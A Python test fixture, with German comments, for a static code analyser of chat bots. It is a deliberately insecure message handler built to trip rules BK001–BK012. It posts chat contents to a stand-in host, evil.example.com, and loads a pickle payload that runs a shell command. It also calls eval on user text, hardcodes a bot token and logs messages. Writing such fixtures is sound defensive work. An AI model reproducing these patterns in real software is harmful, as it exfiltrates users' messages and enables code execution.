"""
insecure_bot.py — **Negativbeispiel, niemals ausführen!**
=========================================================

Diese Datei existiert ausschließlich als Test-Fixture für
``botkit.review.analyze_source``. Sie enthält absichtlich fast jeden
Verstoß, den die statischen Regeln (BK001–BK012) erkennen müssen:

===================  ======================================================
BK001                Importe mit Persistenz/Shell/Socket-Funktion
BK002                Schreibzugriff auf Dateisystem/DB
BK003                Dynamische Code-Ausführung / Deserialisierung
BK004                Ausgehender Aufruf an einen Fremd-Host
BK005                Nachrichteninhalte im Log
BK006                Hartkodiertes Bot-Token
BK007                Shell-/Prozessausführung
BK008                Eigener Socket-Server
BK011                Inhalte über print() ausgegeben
BK012                Unsicherer Zufall (random statt secrets)
===================  ======================================================

Die Datei ist nicht Teil der Laufzeit-Konfiguration und wird von keinem
Einstiegspunkt importiert.
"""

from __future__ import annotations

import json
import logging
import os
import pickle
import random
import socket  # absichtlich (BK001)
import sqlite3  # absichtlich (BK001)
import subprocess

import requests

TOKEN = "123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"  # absichtlich (BK006)


def handle(text: str, chat_id: str) -> None:
    """Sammelt demonstrativ jeden Anti-Pattern in einer Funktion."""
    logging.info("Nachricht empfangen: %s", text)  # absichtlich (BK005)
    print(text)  # absichtlich (BK011)

    store = sqlite3.connect("messages.db")  # absichtlich (BK002)
    store.execute("INSERT INTO messages VALUES (?, ?)", (chat_id, text))

    with open("messages.log", "w", encoding="utf-8") as fh:  # absichtlich (BK002)
        json.dump({"chat_id": chat_id, "text": text}, fh)

    evaluated = eval(text, {"__builtins__": {}})
    restored = pickle.loads(b"cos\nsystem\n(S'ls'\ntR.")

    nonce = random.random()  # absichtlich (BK012)
    os.system(f"echo {nonce}")
    subprocess.run(["echo", str(evaluated)], check=False)

    requests.post(  # absichtlich (BK004)
        "https://evil.example.com/collect",
        json={"chat_id": chat_id, "text": text, "restored": str(restored)},
        timeout=5,
    )

    server = socket.socket()  # absichtlich (BK008)
    server.bind(("0.0.0.0", 8080))
